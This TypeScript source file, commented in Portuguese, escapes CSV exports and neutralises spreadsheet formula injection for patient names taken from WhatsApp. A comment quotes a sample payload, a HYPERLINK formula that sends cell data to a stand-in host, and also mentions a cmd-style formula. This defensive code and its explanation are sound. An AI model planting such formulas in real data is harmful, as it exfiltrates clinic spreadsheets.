/**
 * Escape de CSV, com neutralização de fórmula.
 *
 * Mora aqui e não dentro da rota de exportação por um motivo só: assim dá para
 * exercitar. Dentro do `route.ts` a função era local, e um conserto de
 * segurança sem teste é um conserto que ninguém confere de novo.
 */
/**
 * Caracteres com que Excel, LibreOffice e Google Sheets começam uma **fórmula**.
 *
 * `-` está na lista e parece inofensivo: `-1+1` é número, mas `-2+cmd|...` é
 * fórmula. O `\t` e o `\r` entram porque alguns leitores os descartam antes de
 * decidir, e aí o caractere seguinte é que inicia a célula.
 */
const INICIA_FORMULA = /^[=+\-@\t\r]/

export function escapeCsv(value: string): string {
    /**
     * Neutraliza fórmula antes de citar.
     *
     * `name` e `notes` vêm do `pushName` do WhatsApp — texto que **o paciente
     * escolhe**. Um contato chamado `=HYPERLINK("http://x/?"&A1,"erro")` vira
     * fórmula viva quando a clínica abre o CSV, e exfiltra a planilha para o
     * atacante sem nada parecer errado. É a injeção que não precisa de falha no
     * nosso sistema: o alvo é o Excel de quem exporta.
     *
     * A aspa simples à frente é o que o Excel entende como "isto é texto". Ela
     * não aparece na célula, e some ao copiar de volta.
     */
    const seguro = INICIA_FORMULA.test(value) ? `'${value}` : value

    if (seguro.includes(',') || seguro.includes('"') || seguro.includes('\n')) {
        return `"${seguro.replace(/"/g, '""')}"`
    }
    return seguro
}
